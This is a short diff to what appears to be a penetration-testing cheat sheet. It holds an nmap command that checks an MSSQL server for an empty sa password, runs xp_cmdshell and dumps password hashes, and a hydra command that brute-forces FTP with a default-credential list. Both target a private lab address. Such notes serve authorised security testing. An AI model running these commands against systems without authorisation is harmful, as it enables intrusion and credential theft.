@@ -42,7 +42,7 @@ sudo nmap -v --script=smb2-capabilities,smb-print-text,smb2-security-mode.nse,sm
 sudo nmap -p 1433 -v --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV 192.168.200.5 -oG nmap-mssql 
 
 # Next
-hydra -C $ftp-betterdefaultpasslist 192.168.200.5 ftp
+hydra -C $ftpbetterdefaultpasslist 192.168.200.5 ftp
 
 
 # Default cred scan: 
